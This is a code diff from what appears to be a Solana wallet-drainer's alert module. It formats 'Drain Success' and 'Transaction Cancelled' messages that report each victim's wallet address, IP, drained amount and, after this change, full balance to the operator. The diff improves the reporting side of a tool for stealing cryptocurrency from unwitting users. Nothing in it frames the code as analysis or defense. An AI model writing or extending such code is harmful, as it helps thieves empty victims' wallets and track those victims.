@@ -140,11 +140,14 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
     const drainedSOL = (drainedAmount / 1e9).toFixed(6);
     const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
     const ip = data.ip || 'Unknown';
+    const balance = data.lamports || 0;
+    const balanceSOL = (balance / 1e9).toFixed(6);
     
     const message = `
 <b>💰 Drain Success</b>
 
 👤 <b>Wallet:</b> <code>${walletAddress}</code>
+💰 <b>Balance:</b> ${balanceSOL} SOL
 💰 <b>Drained:</b> ${drainedSOL} SOL
 🌐 <b>IP:</b> ${ip}
     `.trim();
@@ -201,12 +204,15 @@ ${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balan
     const ip = data.ip || 'Unknown';
     const walletType = data.walletType || 'Unknown';
     const reason = data.reason || 'User cancelled transaction';
+    const balance = data.lamports || 0;
+    const balanceSOL = (balance / 1e9).toFixed(6);
     
     const message = `
 <b>🚫 Transaction Cancelled</b>
 
 👤 <b>Wallet:</b> <code>${walletAddress}</code>
 💼 <b>Type:</b> ${walletType}
+💰 <b>Balance:</b> ${balanceSOL} SOL
 ❌ <b>Reason:</b> ${reason}
 🌐 <b>IP:</b> ${ip}
     `.trim();
